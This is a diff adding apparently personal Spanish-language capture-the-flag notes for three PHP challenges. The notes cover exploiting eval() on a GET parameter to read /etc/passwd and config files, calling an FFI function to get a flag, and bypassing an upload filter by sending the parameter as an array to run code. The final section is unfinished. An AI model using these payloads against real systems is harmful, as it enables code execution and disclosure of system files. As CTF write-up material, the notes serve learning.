@@ -1,0 +1,179 @@
+easyphp
+	My php have some problem that some functions are not working correctly or even disabled! Help me get the flag in the server: http://pwnable.org:19260/
+	 tenemos una web en PHP con este codigo. Si pasamos por GET el parámetro rh, PHP hace eval() de lo q le mandemos al parametro (parsea el PHP y lo ejecuta, la sintaxis de lo que enviemos tiene q ser correcta).
+	 
+	 <?php
+		if (isset($_GET['rh'])) {
+			eval($_GET['rh']);
+		} else {
+			show_source(__FILE__);
+		}
+
+
+	Ejemplos para entender el funcionamiento:
+	GET /?rh=echo "hola";
+	la web devuelve en el fuente hola
+
+	si listamos directorios en el webroot, muestra q existe solo el index.php
+	GET /?rh=var_dump(scandir('.')); HTTP/1.1
+	 array(3) {
+		[0]=>
+		string(1) "."
+		[1]=>
+		string(2) ".."
+		[2]=>
+		string(9) "index.php"
+	}
+
+	si hacemos request de GET /?rh=phpinfo();
+	nos muestra todo el phpinfo.
+
+	Utilizando include() traté de obtener todos los archivos de configuracion de ahi y de sistema. 
+	A veces funcionaba, a veces no, es un problema porque capaz la respuesta ya la sabes y el reto no te devuelve nada. 
+	Ej de archivos q descargué:
+		GET /?rh=include('/usr/local/etc/php/conf.d/docker-vars.ini'); HTTP/1.1
+		GET /?rh=include('/etc/passwd'); HTTP/1.1
+		GET /?rh=include('/usr/local/etc/php-fpm.conf'); HTTP/1.1
+		etc etc.. nada de flags hasta acá
+		
+	una de las lineas me llamó la atencion
+	SUPERVISOR_SERVER_URL	unix:///dev/shm/supervisor.sock	
+		
+		GET /?rh=include('/dev/shm/supervisor.sock'); HTTP/1.1
+		Host: pwnable.org:19260
+
+	hacer muchas veces el request, va variando a cada rato
+
+	en una de las respuestas devuelve esto
+	*****************************************************
+		HTTP/1.1 200 OK
+		Server: nginx
+		Date: Sat, 27 Jun 2020 16:46:15 GMT
+		Content-Type: text/html; charset=UTF-8
+		Connection: keep-alive
+		X-Powered-By: PHP/7.4.5
+		Content-Length: 475
+
+		string(79) "#define FFI_LIB "/flag.so"
+		#define FFI_SCOPE "flag"
+
+		char* flag_fUn3t1on_fFi();"
+		 <br />
+		<b>Warning</b>:  include(/dev/shm/supervisor.sock): failed to open stream: Permission denied in <b>/var/www/html/index.php(3) : eval()'d code</b> on line <b>1</b><br />
+		<br />
+		<b>Warning</b>:  include(): Failed opening '/dev/shm/supervisor.sock' for inclusion (include_path='.:/usr/local/lib/php') in <b>/var/www/html/index.php(3) : eval()'d code</b> on line <b>1</b><br />
+	*****************************************************
+
+	probe este request con curl y me da este error: Warning: Binary output can mess up your terminal. Use "--output <FILE>" bla bla
+	*****************************************************
+		GET /?rh=echo flag_fUn3t1on_fFi(); HTTP/1.1
+		Host: pwnable.org:19260
+	*****************************************************
+
+	request final:
+		curl "http://pwnable.org:19260/?rh=echo flag_fUn3t1on_fFi();" --output aa.txt
+		cat aa.txt (un choclo binario, y entre eso esta el flag)
+		
+	flag{FFi_1s_qu1T3_DANg1ouS}
+
+noeasyphp
+	My php have some problem that some functions are not working correctly or even disabled! 
+	This time we have no idea about it... Help me get the flag in the server: http://pwnable.org:19261/
+	otra vez esto:
+	 <?php
+		if (isset($_GET['rh'])) {
+			eval($_GET['rh']);
+		} else {
+			show_source(__FILE__);
+		}
+	
+	veo la config de php
+	http://pwnable.org:19261/?rh=phpinfo();
+	
+	comparo los disabled functions del reto anterior con este y veo cuales hay de diferencia (las pongo una x linea en archivos a.txt y b.txt)
+	grep -v -xF -f b.txt a.txt > c.txt
+	
+	el scandir está habilitado, no sirve para un carajo
+	http://pwnable.org:19261/?rh=var_dump(scandir(%27.%27));
+	
+	GET /?rh=try{include('/etc/passwd')%3b}catch(Exception+$e){var_dump($e);}%3b HTTP/1.1
+	Host: pwnable.org:19261
+	Connection: keep-alive
+
+	pruebo la funcion definida inicialmente
+	GET /?rh=show_source('index.php'); HTTP/1.1
+
+	puedo iniciar sesiones
+	GET /?rh=session_start();$_SESSION[1]=3;var_dump($_SESSION); HTTP/1.1
+	
+	obtengo las funciones definidas en PHP y veo de hacer una lista para probar
+	GET /?rh=var_dump(get_defined_functions()); HTTP/1.1
+	
+	datos del server
+	GET /?rh=var_dump(php_uname()); HTTP/1.1
+	string(89) "Linux ec811e758d12 4.15.0-108-generic #109-Ubuntu SMP Fri Jun 19 11:33:10 UTC 2020 x86_64"
+	
+	interfaces del server
+	GET /?rh=var_dump(net_get_interfaces()); HTTP/1.1
+	
+	nada de nada
+		
+Cloud Computing
+	tenemos este codigo
+	<?php
+		error_reporting(0);
+		include 'function.php';
+		$dir = 'sandbox/' . sha1($_SERVER['REMOTE_ADDR'] . $_SERVER['HTTP_USER_AGENT']) . '/';
+		if(!file_exists($dir)){
+		  mkdir($dir);
+		}
+		switch ($_GET["action"] ?? "") {
+		  case 'pwd':
+			echo $dir;
+			break;
+		  case 'upload':
+			$data = $_GET["data"] ?? "";
+			if (waf($data)) {
+			  die('waf sucks...');
+			}
+			file_put_contents("$dir" . "index.php", $data);
+		  case 'shell':
+			initShellEnv($dir);
+			include $dir . "index.php";
+			break;
+		  default:
+			highlight_file(__FILE__);
+			break;
+		}
+		
+		podria ver el contenido de function.php?
+		que hace esto: 
+		?action=pwd, me muestra el directorio donde guardaria mi contenido (hace sha1 de mi ip y useragent). Actualmente es sandbox/5aac612ddef08eb2ff4000acebd788c1a0932033/
+		?action=upload&data=x y pasa el waf($data) es false, guarda el contenido de $data en pwd/index.php
+		?action=shell me ejecuta mi index.php (o podria ir directamente a /sandbox/5aac612ddef08eb2ff4000acebd788c1a0932033/index.php y no se ejecutaria initShellEnv($dir) (accediendo directamente da 403 forbidden)
+		como despues del case 'upload' no hay
+		
+		busco alguna forma de guardar contenido bypasseando el waf
+		GET /?action=upload&data=1 HTTP/1.1 da OK 1
+		GET /?action=upload&data=0 HTTP/1.1 da OK 0
+		GET /?action=upload&data=<?=3/2?> HTTP/1.1 da 1.5
+		GET /?action=upload&data=<?="3/2"?> HTTP/1.1 da 3/2
+		GET /?action=upload&data[]=init&data[]=asd HTTP/1.1 pongo data[] para waf bypass
+		GET /?action=upload&data[]=<?&data[]=init&data[]=ShellEnv&data[]=("");var_dump($dir);?>&data[]=<?="asd"?> HTTP/1.1 da string(49) "sandbox/5aac612ddef08eb2ff4000acebd788c1a0932033/"asd
+		GET /?action=upload&data[]=<?&data[]=init&data[]=ShellEnv&data[]=("");ini_set("display_errors",1);var_dump($dir);include(__FILE__)??"no";?> HTTP/1.1 hace un monton de output
+		GET /?action=upload&data[]=<?php%0d%0a&data[]=&data[]=&data[]=initShellEnv($dir);var_dump($_SERVER);?> HTTP/1.1
+		estoy cerca de hacer highlight de function.php
+		GET /?action=upload&data[]=<?php%0d%0a&data[]=&data[]=&data[]=initShellEnv($dir);highlight_file("/var/www/html/function.php");?> HTTP/1.1
+		GET /?action=upload&data[]=<?php%0d%0a&data[]=&data[]=&data[]=initShellEnv($dir);highlight_file(__DIR__."/index&data[]=.php");?> HTTP/1.1
+		ver este, no anda me parece GET /?action=upload&data[]=<?php%0d%0aerror_reporting(1);&data[]=highlight_file("/../../function.php");var_dump($dir);&data[]=var_dump(file_get_contents(__DIR__."/../../index.php"));?> HTTP/1.1
+		
+		
+		aaa
+		GET /?action=upload&data[]=<?php%0d%0a$dir="/var/www/html/1";initShellEnv($dir);highlight_file("index.php");var_dump($dir);die; HTTP/1.1
+		GET /?action=shell HTTP/1.1
+
+
+		esto me hace highlight de mi index, no me toma el initShellEnv del directorio de arriba, por ende no puedo hacer ../. como el el case después de file_put_contents no hay break, entra al case shell. 
+		GET /?action=upload&data[]=<?php%0d%0ainitShellEnv($dir);$dir=__DIR__."/";var_dump($dir);var_dump(file_exists($dir."/index.php"));highlight_file(__DIR__."/index.php"); HTTP/1.1
+
+		
